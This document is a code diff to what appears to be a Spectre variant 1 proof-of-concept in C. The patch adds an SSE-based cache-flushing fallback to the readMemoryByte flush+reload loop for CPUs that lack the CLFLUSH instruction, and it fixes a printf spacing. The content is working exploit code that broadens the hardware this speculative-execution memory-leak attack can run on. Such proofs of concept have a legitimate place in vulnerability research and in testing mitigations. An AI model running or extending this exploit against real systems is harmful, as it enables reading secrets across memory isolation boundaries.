@@ -57,6 +57,7 @@ void victim_function(size_t x) {
   }
 }
 
+
 /********************************************************************
 Analysis code
 ********************************************************************/
@@ -64,6 +65,20 @@ Analysis code
 #define CACHE_FLUSH_ITERATIONS 2048
 #define CACHE_FLUSH_STRIDE 4096
 uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
+
+/* Flush memory using long SSE instructions */
+void flush_memory_sse(uint8_t * addr)
+{
+  float * p = (float *)addr;
+  float c = 0.f;
+  __m128 i = _mm_setr_ps(c, c, c, c);
+
+  int k, l;
+  /* Non-sequential memory addressing by looping through k by l */
+  for (k = 0; k < 4; k++)
+    for (l = 0; l < 4; l++)
+      _mm_stream_ps(&p[(l * 4 + k) * 4], i);
+}
 #endif
 
 /* Report best guess in value[0] and runner-up in value[1] */
@@ -83,9 +98,17 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
 
+#ifndef NOCLFLUSH
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
+#else
+    /* Flush array2[256*(0..255)] from cache
+       using long SSE instruction several times */
+    for (j = 0; j < 16; j++)
+      for (i = 0; i < 256; i++)
+        flush_memory_sse( & array2[i * 512]);
+#endif
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
@@ -261,7 +284,7 @@ int main(int argc,
   #ifndef NOMFENCE
     printf("MFENCE_SUPPORTED ");
   #else
-    printf("MFENCE_NOT_SUPPORTED");
+    printf("MFENCE_NOT_SUPPORTED ");
   #endif
   #ifndef NOCLFLUSH
     printf("CLFLUSH_SUPPORTED ");
